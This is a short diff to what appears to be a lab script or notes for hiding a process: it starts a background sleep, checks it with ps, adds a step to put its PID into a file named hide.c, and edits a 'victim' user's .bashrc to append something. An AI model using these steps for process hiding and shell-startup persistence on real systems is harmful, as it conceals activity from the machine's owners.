@@ -8,6 +8,9 @@ sleep 9999 &
 #Validate its running
 ps aux | grep sleep
 
+#take the PID and add edit the hide.c file and add the PID to the script
+nano hide.c 
+
 #configure the bash scripting files 
 nano /home/victim/.bashrc
 #insert at the very end f the file 
